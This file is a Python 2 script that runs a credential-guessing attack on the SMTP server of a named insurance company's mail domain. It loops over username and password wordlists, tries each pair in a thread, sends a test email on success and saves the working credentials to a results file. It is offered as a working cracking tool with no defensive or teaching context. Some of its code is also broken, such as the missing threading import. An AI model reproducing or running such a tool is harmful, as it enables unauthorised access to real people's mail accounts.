#!/usr/bin/env python
# -*- coding: gbk -*-
import smtplib
from email.mime.text import MIMEText
import time
#############
mailto_list=["ves_test@163.com"]
#####################
mail_host="mail.e-chinalife.com"
#mail_user="xxx"
#mail_pass="yyy"
mail_postfix="e-chinalife.com"
######################

class timer(threading.Thread): #The timer class is derived from the class threading.Thread  
    def __init__(self, to_list,sub,content,mail_user,mail_pass):  
        threading.Thread.__init__(self)  
        self.mail_user = mail_user 
        self.mail_pass = mail_pass  
        self.to_list = to_list
        self.sub = sub
        self.content = content
        self.thread_stop = False  
   
    def run(self): #Overwrite run() method, put what you want the thread do here  
        while not self.thread_stop:  
            #print 'Thread Object(%d), Time:%s/n' %(self.thread_num, time.ctime())  
            #time.sleep(self.interval)  
            me=self.mail_user+"<"+self.mail_user+"@"+mail_postfix+">"
            msg = MIMEText(self.content)
            msg['Subject'] = self.sub
            msg['From'] = me
            msg['To'] = ";".join(self.to_list)
            try:
                s = smtplib.SMTP()
                s.connect(mail_host)
                s.login(self.mail_user,self.mail_pass)
                s.sendmail(me, self.to_list, msg.as_string())
                s.close()
                f.writelines(self.mail_user+':'+self.mail_pass+'\n')
                print self.mail_user,":success!"
                return True
            except Exception, e:
                print str(e)
                return False
    def stop(self):  
        self.thread_stop = True  


#def send_mail(to_list,sub,content):
#    me=mail_user+"<"+mail_user+"@"+mail_postfix+">"
#    msg = MIMEText(content)
#    msg['Subject'] = sub
#    msg['From'] = me
#    msg['To'] = ";".join(to_list)
#    try:
#        s = smtplib.SMTP()
#        s.connect(mail_host)
#        s.login(mail_user,mail_pass)
#        s.sendmail(me, to_list, msg.as_string())
#        s.close()
#        return True
#    except Exception, e:
#        print str(e)
#        return False

if __name__ == '__main__':
    global f
    f=open('email_result.txt','w+')
    for mail_user in open('user.txt'):
        for mail_pass in open('pass.txt'):
            crack_thread=timer(mailto_list,"subject","test",mail_user,mail_pass)
            crack_thread.start()
            #if send_mail(mailto_list,"subject","test",mail_user,mail_pass):
            #    print "success"
            #    f.write(mail_user+':'+mail_pass+'\n')
            #else:
            #    print "failed"
            time.sleep(1)
            crack_thread.stop()
    f.close()
